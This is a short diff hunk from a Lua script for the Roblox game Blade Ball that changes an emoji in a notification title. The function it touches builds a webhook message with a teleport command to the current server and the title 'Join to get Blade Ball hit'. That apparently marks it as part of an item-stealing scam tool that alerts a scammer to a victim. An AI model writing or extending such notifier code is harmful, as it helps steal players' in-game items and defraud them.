@@ -206,7 +206,7 @@ local function SendJoinMessage(list, prefix)
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
+            ["title"] = "🟢 Join to get Blade Ball hit",
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
